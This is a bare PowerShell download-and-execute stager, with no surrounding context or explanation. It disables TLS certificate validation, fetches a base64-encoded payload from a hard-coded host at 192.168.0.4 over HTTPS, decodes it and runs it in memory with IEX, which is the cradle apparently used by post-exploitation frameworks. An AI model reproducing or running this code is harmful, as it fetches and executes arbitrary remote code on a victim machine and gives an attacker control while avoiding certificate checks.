[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
$MS = [System.Text.Encoding]::UTF8.GetString(
    [System.Convert]::FromBase64String(
        (New-Object System.Net.WebClient).DownloadString('https://192.168.0.4:443/GoPro5/black/2018/_rp')
 )
);
IEX $MS
